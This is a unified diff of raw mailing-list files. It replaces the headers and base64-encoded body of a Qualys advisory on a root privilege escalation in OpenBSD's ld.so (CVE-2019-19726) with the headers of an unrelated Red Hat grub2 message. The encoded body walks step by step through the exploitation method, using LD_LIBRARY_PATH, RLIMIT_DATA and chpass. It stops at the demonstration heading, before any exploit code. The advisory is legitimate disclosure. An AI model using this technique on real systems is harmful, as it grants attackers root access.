@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["12176" "Wednesday" "11" "December" "2019" "21:15:43" "+0000" "Qualys Security Advisory" "qsa@qualys.com" nil "200" nil "^Date:" nil nil "12" nil nil (number mark "U       qsa@qualys.c Dec 11  200/12176 " thread-indent "\"[oss-security] Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["707" "Tuesday" "26" "November" "2019" "08:53:20" "+0530" "Huzaifa Sidhpurwala" "huzaifas@redhat.com" nil "20" nil "^Date:" nil nil "11" nil nil (number mark "        huzaifas@red Nov 26   20/707   " thread-indent "\"[oss-security] grub2-set-bootflag utility causes grubenv corruption rendering the system un-bootable\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] grub2-set-bootflag utility causes grubenv corruption rendering the system un-bootable" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 32130 invoked by uid 550); 11 Dec 2019 21:16:03 -0000
+Received: (qmail 25847 invoked by uid 550); 26 Nov 2019 03:23:39 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,285 +11,68 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 32089 invoked from network); 11 Dec 2019 21:16:02 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
- date : message-id : content-type : content-id : content-transfer-encoding
- : mime-version; s=qualyscom;
- bh=CJI30iU+NCuOmPhT0Sg94eDvV/SgYC0327EiGv1D65c=;
- b=iCVWHz2FytAnLIrz55pUGq0X9xDuTY6dONi3HsdE4jAob5CbSWMRkBKsbMG8YGdtPmo1
- qpuO+7Z7zCXIyKUamgmtn1FPPQsxfNvmWu7tV/fWiBNhZrz/rF+XPZ6w5cw8KJa7oOXW
- lZFt+5nHRDC2GshQ8XSYFIFNVo/N1FkqqzPY6H2nJXsptPAWEuraT2altOgDEgGrycbc
- jdGG5CdFsd9rQs0fesg8YKinJdUIEZA/hI7SAEVNIaWjmjXf4pRJemIOe/q5pnTrecnx
- 1fdwM+wjnLGxUu9a/+mliAEoUFoLdLBN+vzuI66U0jyptFfhJkTYQTOsGU7GXY2oZHHl zA== 
-Authentication-Results: ppops.net;
-	spf=pass smtp.mailfrom=qsa@qualys.com
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=bm4DMhSa7da1sFuEGxabZbWPzV8YgIiLdViIWKrHMPocB2YQE0oM0M9N8c2/EDjMLxb+UIFyoAmVYHhQ6kb9jg22OpcQlEadFLHgvEBpgitTxc7OOaZpmQMSqY6bmr/qtRyyAt/gmVWvl1lDdknx/1qbQUe/RS+q+agXPvSrli9Ajgy61ah8Sdhz3vu3sH78zqtYeY3Uj2RSc0S2TMhVvPTtBGEj8RUfPJn9KMPi9CCt9/YGg3joUpF0N8Dg87hv2D4h6/vq4JySdDTaCLDY8aNKnNOcDPd3A/39DYLFAA/2T5EAqXU1rzx5wWBLtaSudg6eCwwJbMoLyuEmrI/u6g==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=CJI30iU+NCuOmPhT0Sg94eDvV/SgYC0327EiGv1D65c=;
- b=BoGmPEk2/fWwRfvPgbCN4N58OBgWqmTTLM1pChd2Ppla6+BGiDMraUMA5RFxfNyzWWFfzMwOJNp39qBzsI2TcznG5ePbI8+M4tD0NSbMMjwzdnPXOL00kAW0LubU09pIId0OvCrkW9qbEDSWKtR2ogUyDYwMaKcN+0QFIcIOQ4iwKA81bir5Ckyr1VjSR3leo1wDHPzEBiUYwDa+l+IyPJ+MnZXwqY+Tgt8eDkkSk4jRGC9W2d1Z2dVRJoGtdxFPxKIqiJZa/RjaM0nwdBM4E1tJy4VDQxlXNpCuEPg4TTWzMzf2NbLWfucixMYi3FKiJyWWu16m3yDop8rhvrzOxQ==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
- dkim=pass header.d=qualys.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=qualys.onmicrosoft.com; s=selector2-qualys-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=CJI30iU+NCuOmPhT0Sg94eDvV/SgYC0327EiGv1D65c=;
- b=Rt5gdJ+JZ0s7Wy1V4ZbPx30R86XEFu2KYMAOkYqC79zW7faAz8CA2MekHCNiaAmQkx+7+f5JVstcHewDb6Kj8btaG4IoNWk0gwqwyk0N89SFG5SeaHTgFqQ24rp+IQnqz7WZ1ZcrqhAVrxSZbSyuq6S26xiOPHh+rKa2R+UODTo=
-Thread-Topic: Local Privilege Escalation in OpenBSD's dynamic loader
- (CVE-2019-19726)
-Thread-Index: AQHVsGglOxjMANSMHk68FnxwpM7ylQ==
-Message-ID: <20191211210637.GE26987@localhost.localdomain>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach: 
-X-MS-TNEF-Correlator: 
-x-clientproxiedby: BYAPR05CA0072.namprd05.prod.outlook.com
- (2603:10b6:a03:74::49) To DM6PR06MB4090.namprd06.prod.outlook.com
- (2603:10b6:5:89::22)
-x-ms-exchange-messagesentrepresentingtype: 1
-x-originating-ip: [165.193.18.162]
-x-ms-publictraffictype: Email
-x-ms-office365-filtering-correlation-id: 9e5c665b-c6be-4c83-df88-08d77e7f4843
-x-ms-traffictypediagnostic: DM6PR06MB4700:
-x-microsoft-antispam-prvs: 
- <DM6PR06MB4700A50923CE03E621BF2DE1D55A0@DM6PR06MB4700.namprd06.prod.outlook.com>
-x-ms-oob-tlc-oobclassifiers: OLM:5797;
-x-forefront-prvs: 024847EE92
-x-forefront-antispam-report: 
- SFV:NSPM;SFS:(10019020)(376002)(136003)(366004)(396003)(39860400002)(346002)(199004)(189003)(33656002)(6506007)(6916009)(478600001)(66476007)(86362001)(316002)(1076003)(5660300002)(2906002)(8936002)(66946007)(186003)(71200400001)(8676002)(81166006)(26005)(6486002)(64756008)(52116002)(66556008)(6512007)(9686003)(66446008)(81156014)(131040200001);DIR:OUT;SFP:1102;SCL:1;SRVR:DM6PR06MB4700;H:DM6PR06MB4090.namprd06.prod.outlook.com;FPR:;SPF:None;LANG:en;PTR:InfoNoRecords;A:1;MX:1;
-received-spf: None (protection.outlook.com: qualys.com does not designate
- permitted sender hosts)
-x-ms-exchange-senderadcheck: 1
-x-microsoft-antispam: BCL:0;
-x-microsoft-antispam-message-info: 
- 0Nx2wOG9S0Fi59lGYNMgxAB0ANgNGmsfep5sQ9kTbVDlA+R/OLCtS0LQkc3v0lRKj1ZGf9lvHPFznYBPP4KjBh943B0TCEu65KkMqXsFNigJMbFnNkW0gs1j8E8FLoOik3uFQPYC4c7ckLe/zaCxbZRMUh7Ws3+Bjqa0ELzzI8P640JdZeAerXpn8wEktUFZfvEgL9qxAyaj85c19JKoJgVq/l4klHaGkHEtT1CA1MirgIPujywRw5av1l9XJg7I9qa7SPhj/bvphqAJgKPJOEZLbB6I1+7Fsz4QlwZ4OrlLcKqx8rpucPiGhpuoL3xBHpzyPefin4BNyHHaiTf5oVz7oWjdFmB/onfbMjn/l+Lh0B6TI95CtAurzKYetf9+BJrcko+qkG7BCH+zWy1qZ2eLw1LHX5ql1osC3CIrToEaVPUkMeBmjruq0DFcCsJ4GmFcQim1O2hakCMz7hk1NqoIbW0dml77OVA/NaSYSzr5yy60bvf3VU+QNWdX3anU
-x-ms-exchange-transport-forked: True
-Content-Type: text/plain; charset="utf-8"
-Content-ID: <3D01DAF7E8CD5347BA5B75795D5DE18A@namprd06.prod.outlook.com>
-Content-Transfer-Encoding: base64
+Received: (qmail 25829 invoked from network); 26 Nov 2019 03:23:38 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1574738607;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:autocrypt:autocrypt;
+	bh=kQWFEkXaQNdb4qf18M+kdTsHEgsWIosGMlbv2PAwZCg=;
+	b=cAEx/pl+ace1uP3hCo6usFyY+BO+ZGP9RwQKXPsLh0p9XO68upmAMTguwDzDNaQudc170Y
+	+u/E9ZS/cruzCXX8DEZXkTC7CkW4wf8zmNsdZshLDn5WhmEA1tAHHOxP4JDFvsD2vvJdcn
+	vW4UEHTF19lhXS5k6hzk33yg1Hj0suo=
+Autocrypt: addr=huzaifas@redhat.com; keydata=
+ mQGiBETun5sRBACOCWbRM5KLDngL46w371lRBMCCmBRpzQHXuxllk1dbku3GYQu5ApCYVvck
+ 45GWqFAYqWVjXGjEOnATxg693FI3Mw8tv8E9JED1OMbyaI4bhUxP1H7Ia89BOEFHjHKR7VPY
+ S9tSwvTr2AkjK1j+CrMcWmV2rL4KooRk/ykB/4joJwCgnoMEbrNCrnSIiZNGxS7Okxgknb8D
+ /AxkMwysc39T68fp0AOAr4wNrwWzgBPqjyF0As5n9ewZie9Z+uqqGCnjn9XgMmMNkL1DsXXs
+ 4dJXaFrAdlcArtWaiQX/d2nZaZj8kw9D7ADudBTA0YzAnVQGk4wf2zL9WT/YwYhV3Sb1TERa
+ H6g4gg8b+KwsbmhJSrqsg06mWR3eA/9j86ollyU31Fq/qIjsbHR+tSManlv57wGiH9luburk
+ bUSFgLo9t2h6bHZ4sTQyt6aJcxXzon2IuiTYVpDrnoAfYfvFvzSae0BPG7nP8moAL7X1nnW0
+ xP8+ZATAqwds75yAQMpGRXuOntFl5ZL1xmzzeDS5aUfMg3gC9M0jIWK3zbQsSHV6YWlmYSBT
+ LiBTaWRocHVyd2FsYSA8aHV6YWlmYXNAcmVkaGF0LmNvbT6IXgQTEQIAHgUCRO6fmwIbAwYL
+ CQgHAwIDFQIDAxYCAQIeAQIXgAAKCRDMcNzy2lva5e+DAJ4hG6WLhJfmJ27UOKZLPRi3gVNx
+ owCeP5f7Cp5aU4DXyK3X81poNLIW2i25AQ0ERO6fnRAEALle4LaG+djyt8slfQbwAPf06dgz
+ bC6o1TcPg/ZRSE8TSE6d1fRkLSLJJZSW9gGpl5fphNYUSzarFKP4xLRol/fZCY4tupcAv+Vm
+ jfzaLqdIiy+G6ei1UpQTP6uRHxLdtXmMmg6kWds0ZavEU2+y18HzAczCCPBQN30dd/1/5jUn
+ AAMFBACOEdEjzZIQmK6ciB6TymIcD8nf6Jn0zz6+DjxrtdEnP7V/zyZgv/tD1GdneOBaGJTL
+ FTqT5vNSsmMTtQ03tjg/e4+P1MX8YcbhObj186Js47moYoeWgfAGZlFd6mNl/aSITVSHsooF
+ zVi9Xs6zKZNWsY2LcENMnE/xM7Qdpi5ChIhJBBgRAgAJBQJE7p+dAhsMAAoJEMxw3PLaW9rl
+ XKEAnjySXTUlGFzWQ9BiLx5Fo91JziLYAJ4lQdBofA+Gf1Vewb/61ilmdq4Qqg==
+Message-ID: <3ed3a6cd-088e-c164-4b1e-53753d79960b@redhat.com>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+ Thunderbird/68.1.1
 MIME-Version: 1.0
-X-OriginatorOrg: qualys.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 9e5c665b-c6be-4c83-df88-08d77e7f4843
-X-MS-Exchange-CrossTenant-originalarrivaltime: 11 Dec 2019 21:15:43.6227
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: ZCDBYTELxew3y+FZC+Teovcpp6vskA7Eu1XjhaMWb3ib+wq8prQC/nNplGGCQP4e+0z+x6HsYgSz50ngp+fDH3CIeDsnch8FwIAPcxw1nHQ=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: DM6PR06MB4700
-X-Proofpoint-SPF-Result: pass
-X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
- include:spf-001ca501.pphosted.com include:stspg-customer.com
- include:spf.salesforce.com include:sendgrid.net include:mktomail.com ~all
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.95,18.0.572
- definitions=2019-12-11_06:2019-12-11,2019-12-11 signatures=0
-Date: Wed, 11 Dec 2019 21:15:43 +0000
-From: Qualys Security Advisory <qsa@qualys.com>
+Content-Language: en-US
+X-Scanned-By: MIMEDefang 2.79 on 10.5.11.12
+X-MC-Unique: S-G8NbSAPC6DH_Trh9_XPQ-1
+X-Mimecast-Spam-Score: 0
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+Date: Tue, 26 Nov 2019 08:53:20 +0530
+From: Huzaifa Sidhpurwala <huzaifas@redhat.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Local Privilege Escalation in OpenBSD's dynamic loader
- (CVE-2019-19726)
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+Subject: [oss-security] grub2-set-bootflag utility causes grubenv corruption rendering the
+ system un-bootable
+To: oss-security@lists.openwall.com
 
-DQpRdWFseXMgU2VjdXJpdHkgQWR2aXNvcnkNCg0KTG9jYWwgUHJpdmlsZWdl
-IEVzY2FsYXRpb24gaW4gT3BlbkJTRCdzIGR5bmFtaWMgbG9hZGVyIChDVkUt
-MjAxOS0xOTcyNikNCg0KDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT0NCkNvbnRlbnRzDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT0NCg0KU3VtbWFyeQ0KQW5hbHlzaXMNCkRlbW9uc3RyYXRpb24NCkFj
-a25vd2xlZGdtZW50cw0KDQoNCj09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PQ0KU3VtbWFyeQ0KPT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09DQoNCldlIGRpc2NvdmVyZWQgYSBMb2NhbCBQcml2aWxlZ2UgRXNj
-YWxhdGlvbiBpbiBPcGVuQlNEJ3MgZHluYW1pYyBsb2FkZXINCihsZC5zbyk6
-IHRoaXMgdnVsbmVyYWJpbGl0eSBpcyBleHBsb2l0YWJsZSBpbiB0aGUgZGVm
-YXVsdCBpbnN0YWxsYXRpb24NCih2aWEgdGhlIHNldC11c2VyLUlEIGV4ZWN1
-dGFibGUgY2hwYXNzIG9yIHBhc3N3ZCkgYW5kIHlpZWxkcyBmdWxsIHJvb3QN
-CnByaXZpbGVnZXMuDQoNCldlIGRldmVsb3BlZCBhIHNpbXBsZSBwcm9vZiBv
-ZiBjb25jZXB0IGFuZCBzdWNjZXNzZnVsbHkgdGVzdGVkIGl0DQphZ2FpbnN0
-IE9wZW5CU0QgNi42ICh0aGUgY3VycmVudCByZWxlYXNlKSwgNi41LCA2LjIs
-IGFuZCA2LjEsIG9uIGJvdGgNCmFtZDY0IGFuZCBpMzg2OyBvdGhlciByZWxl
-YXNlcyBhbmQgYXJjaGl0ZWN0dXJlcyBhcmUgcHJvYmFibHkgYWxzbw0KZXhw
-bG9pdGFibGUuDQoNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09DQpBbmFseXNpcw0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09DQoNCkluIHRoaXMgc2VjdGlvbiwgd2UgYW5hbHl6ZSBhIHN0ZXAtYnkt
-c3RlcCBleGVjdXRpb24gb2Ygb3VyIHByb29mIG9mDQpjb25jZXB0Og0KDQot
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KMS8gV2UgZXhl
-Y3ZlKCkgdGhlIHNldC11c2VyLUlEIC91c3IvYmluL2NocGFzcywgYnV0IGZp
-cnN0Og0KDQogICAxYS8gd2Ugc2V0IHRoZSBMRF9MSUJSQVJZX1BBVEggZW52
-aXJvbm1lbnQgdmFyaWFibGUgdG8gb25lIHNpbmdsZSBkb3QNCiAgICh0aGUg
-Y3VycmVudCB3b3JraW5nIGRpcmVjdG9yeSkgYW5kIGFwcHJveGltYXRlbHkg
-QVJHX01BWCBjb2xvbnMgKHRoZQ0KICAgbWF4aW11bSBudW1iZXIgb2YgYnl0
-ZXMgZm9yIHRoZSBhcmd1bWVudCBhbmQgZW52aXJvbm1lbnQgbGlzdCk7IGFz
-DQogICBkZXNjcmliZWQgaW4gbWFuIGxkLnNvOg0KDQogICAgIExEX0xJQlJB
-UllfUEFUSA0KICAgICAgICAgICAgIEEgY29sb24gc2VwYXJhdGVkIGxpc3Qg
-b2YgZGlyZWN0b3JpZXMsIHByZXBlbmRpbmcgdGhlIGRlZmF1bHQNCiAgICAg
-ICAgICAgICBzZWFyY2ggcGF0aCBmb3Igc2hhcmVkIGxpYnJhcmllcy4gIFRo
-aXMgdmFyaWFibGUgaXMgaWdub3JlZCBmb3INCiAgICAgICAgICAgICBzZXQt
-dXNlci1JRCBhbmQgc2V0LWdyb3VwLUlEIGV4ZWN1dGFibGVzLg0KDQogICAx
-Yi8gd2Ugc2V0IHRoZSBSTElNSVRfREFUQSByZXNvdXJjZSBsaW1pdCB0byBB
-UkdfTUFYICogc2l6ZW9mKGNoYXIgKikNCiAgICgyTUIgb24gYW1kNjQsIDFN
-QiBvbiBpMzg2KTsgYXMgZGVzY3JpYmVkIGluIG1hbiBzZXRybGltaXQ6DQoN
-CiAgICAgUkxJTUlUX0RBVEEgICAgIFRoZSBtYXhpbXVtIHNpemUgKGluIGJ5
-dGVzKSBvZiB0aGUgZGF0YSBzZWdtZW50IGZvciBhDQogICAgICAgICAgICAg
-ICAgICAgICBwcm9jZXNzOyB0aGlzIGluY2x1ZGVzIG1lbW9yeSBhbGxvY2F0
-ZWQgdmlhIG1hbGxvYygzKSBhbmQNCiAgICAgICAgICAgICAgICAgICAgIGFs
-bCBvdGhlciBhbm9ueW1vdXMgbWVtb3J5IG1hcHBlZCB2aWEgbW1hcCgyKS4N
-Cg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCjIvIEJl
-Zm9yZSB0aGUgbWFpbigpIGZ1bmN0aW9uIG9mIGNocGFzcyBpcyBleGVjdXRl
-ZCwgdGhlIF9kbF9ib290KCkNCmZ1bmN0aW9uIG9mIGxkLnNvIGlzIGV4ZWN1
-dGVkIGFuZCBjYWxscyBfZGxfc2V0dXBfZW52KCk6DQoNCjI2MiB2b2lkDQoy
-NjMgX2RsX3NldHVwX2Vudihjb25zdCBjaGFyICphcmd2MCwgY2hhciAqKmVu
-dnApDQoyNjQgew0KLi4uDQoyNzEgICAgICAgICBfZGxfbGlicGF0aCA9IF9k
-bF9zcGxpdF9wYXRoKF9kbF9nZXRlbnYoIkxEX0xJQlJBUllfUEFUSCIsIGVu
-dnApKTsNCi4uLg0KMjgzICAgICAgICAgX2RsX3RydXN0ID0gIV9kbF9pc3Nl
-dHVnaWQoKTsNCjI4NCAgICAgICAgIGlmICghX2RsX3RydXN0KSB7ICAgICAg
-IC8qIFphcCBwYXRocyBpZiBzW3VnXWlkLi4uICovDQoyODUgICAgICAgICAg
-ICAgICAgIGlmIChfZGxfbGlicGF0aCkgew0KMjg2ICAgICAgICAgICAgICAg
-ICAgICAgICAgIF9kbF9mcmVlX3BhdGgoX2RsX2xpYnBhdGgpOw0KMjg3ICAg
-ICAgICAgICAgICAgICAgICAgICAgIF9kbF9saWJwYXRoID0gTlVMTDsNCjI4
-OCAgICAgICAgICAgICAgICAgICAgICAgICBfZGxfdW5zZXRlbnYoIkxEX0xJ
-QlJBUllfUEFUSCIsIGVudnApOw0KMjg5ICAgICAgICAgICAgICAgICB9DQoN
-Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQozLyBBdCBs
-aW5lIDI3MSwgX2RsX2dldGVudigpIHJldHVybnMgYSBwb2ludGVyIHRvIG91
-ciBMRF9MSUJSQVJZX1BBVEgNCmVudmlyb25tZW50IHZhcmlhYmxlIGFuZCBw
-YXNzZXMgaXQgdG8gX2RsX3NwbGl0X3BhdGgoKToNCg0KIDIzIGNoYXIgKioN
-CiAyNCBfZGxfc3BsaXRfcGF0aChjb25zdCBjaGFyICpzZWFyY2hwYXRoKQ0K
-IDI1IHsNCiAuLg0KIDM1ICAgICAgICAgcHAgPSBzZWFyY2hwYXRoOw0KIDM2
-ICAgICAgICAgd2hpbGUgKCpwcCkgew0KIDM3ICAgICAgICAgICAgICAgICBp
-ZiAoKnBwID09ICc6JyB8fCAqcHAgPT0gJzsnKQ0KIDM4ICAgICAgICAgICAg
-ICAgICAgICAgICAgIGNvdW50Kys7DQogMzkgICAgICAgICAgICAgICAgIHBw
-Kys7DQogNDAgICAgICAgICB9DQogLi4NCiA0NSAgICAgICAgIHJldHZhbCA9
-IF9kbF9yZWFsbG9jYXJyYXkoTlVMTCwgY291bnQsIHNpemVvZigqcmV0dmFs
-KSk7DQogNDYgICAgICAgICBpZiAocmV0dmFsID09IE5VTEwpDQogNDcgICAg
-ICAgICAgICAgICAgIHJldHVybiAoTlVMTCk7DQoNCi0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQo0LyBBdCBsaW5lIDQ1LCBjb3VudCBp
-cyBhcHByb3hpbWF0ZWx5IEFSR19NQVggKHRoZSBudW1iZXIgb2YgY29sb25z
-IGluDQpvdXIgTERfTElCUkFSWV9QQVRIKSBhbmQgX2RsX3JlYWxsb2NhcnJh
-eSgpIHJldHVybnMgTlVMTCAoYmVjYXVzZSBvZiBvdXINCmxvdyBSTElNSVRf
-REFUQSk7IGF0IGxpbmUgNDcsIF9kbF9zcGxpdF9wYXRoKCkgcmV0dXJucyBO
-VUxMLg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0K
-NS8gQXMgYSByZXN1bHQsIF9kbF9saWJwYXRoIGlzIE5VTEwgKGxpbmUgMjcx
-KSBhbmQgb3VyIExEX0xJQlJBUllfUEFUSA0KaXMgaWdub3JlZCwgYnV0IGl0
-IGlzIG5vdCBkZWxldGVkIGZyb20gdGhlIGVudmlyb25tZW50IChDVkUtMjAx
-OS0xOTcyNik6DQphbHRob3VnaCBfZGxfdHJ1c3QgaXMgZmFsc2UgKF9kbF9p
-c3NldHVnaWQoKSByZXR1cm5zIHRydWUgYmVjYXVzZSBjaHBhc3MNCmlzIHNl
-dC11c2VyLUlEKSwgX2RsX3Vuc2V0ZW52KCkgaXMgbm90IGNhbGxlZCAobGlu
-ZSAyODgpIGJlY2F1c2UNCl9kbF9saWJwYXRoIGlzIE5VTEwgKGxpbmUgMjg1
-KS4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCjYv
-IE5leHQsIHRoZSBtYWluKCkgZnVuY3Rpb24gb2YgY2hwYXNzIGlzIGV4ZWN1
-dGVkLCBhbmQgaXQ6DQoNCiAgIDZhLyBjYWxscyBzZXR1aWQoMCksIHdoaWNo
-IHNldHMgdGhlIHJlYWwgYW5kIGVmZmVjdGl2ZSB1c2VyIElEcyB0byAwOw0K
-DQogICA2Yi8gY2FsbHMgcHdfaW5pdCgpLCB3aGljaCByZXNldHMgUkxJTUlU
-X0RBVEEgdG8gUkxJTV9JTkZJTklUWTsNCg0KICAgNmMvIGNhbGxzIHB3X21r
-ZGIoKSwgd2hpY2ggdmZvcmsoKXMgYW5kIGV4ZWN2KClzIC91c3Ivc2Jpbi9w
-d2RfbWtkYg0KICAgKHVubGlrZSBleGVjdmUoKSwgZXhlY3YoKSBkb2VzIG5v
-dCByZXNldCB0aGUgZW52aXJvbm1lbnQpLg0KDQotLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0NCg0KNy8gQmVmb3JlIHRoZSBtYWluKCkgZnVu
-Y3Rpb24gb2YgcHdkX21rZGIgaXMgZXhlY3V0ZWQsIHRoZSBfZGxfYm9vdCgp
-DQpmdW5jdGlvbiBvZiBsZC5zbyBpcyBleGVjdXRlZCBhbmQgY2FsbHMgX2Rs
-X3NldHVwX2VudigpOg0KDQogICA3YS8gYXQgbGluZSAyNzEsIF9kbF9nZXRl
-bnYoKSByZXR1cm5zIGEgcG9pbnRlciB0byBvdXINCiAgIExEX0xJQlJBUllf
-UEFUSCBlbnZpcm9ubWVudCB2YXJpYWJsZSAoYmVjYXVzZSBpdCB3YXMgbm90
-IGRlbGV0ZWQgZnJvbQ0KICAgdGhlIGVudmlyb25tZW50IGluIHN0ZXAgNSwg
-YW5kIGJlY2F1c2UgZXhlY3YoKSBkaWQgbm90IHJlc2V0IHRoZQ0KICAgZW52
-aXJvbm1lbnQgaW4gc3RlcCA2Yyk7DQoNCiAgIDdiLyBhdCBsaW5lIDQ1LCBf
-ZGxfcmVhbGxvY2FycmF5KCkgZG9lcyBub3QgcmV0dXJuIE5VTEwgYW55bW9y
-ZQ0KICAgKGJlY2F1c2Ugb3VyIGxvdyBSTElNSVRfREFUQSB3YXMgcmVzZXQg
-aW4gc3RlcCA2Yik7DQoNCiAgIDdjLyBhcyBhIHJlc3VsdCwgX2RsX2xpYnBh
-dGggaXMgbm90IE5VTEwgKGxpbmUgMjcxKSwgYW5kIGl0IGlzIG5vdA0KICAg
-cmVzZXQgdG8gTlVMTCAobGluZSAyODcpIGJlY2F1c2UgX2RsX3RydXN0IGlz
-IHRydWUgKF9kbF9pc3NldHVnaWQoKQ0KICAgcmV0dXJucyBmYWxzZSBiZWNh
-dXNlIHB3ZF9ta2RiIGlzIG5vdCBzZXQtdXNlci1JRCwgYW5kIGJlY2F1c2Ug
-dGhlDQogICByZWFsIGFuZCBlZmZlY3RpdmUgdXNlciBJRHMgd2VyZSBib3Ro
-IHNldCB0byAwIGluIHN0ZXAgNmEpOiBvdXINCiAgIExEX0xJQlJBUllfUEFU
-SCBpcyBub3QgaWdub3JlZCBhbnltb3JlLg0KDQotLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0NCg0KOC8gRmluYWxseSwgbGQuc28gc2VhcmNo
-ZXMgZm9yIHNoYXJlZCBsaWJyYXJpZXMgaW4gX2RsX2xpYnBhdGggKG91cg0K
-TERfTElCUkFSWV9QQVRIKSBhbmQgbG9hZHMgb3VyIG93biBsaWJyYXJ5IGZy
-b20gdGhlIGN1cnJlbnQgd29ya2luZw0KZGlyZWN0b3J5ICh0aGUgZG90IGlu
-IG91ciBMRF9MSUJSQVJZX1BBVEgpLg0KDQotLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0NCg0KDQo9PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT0NCkRlbW9uc3RyYXRpb24NCj09PT09PT09PT09PT09PT09PT09
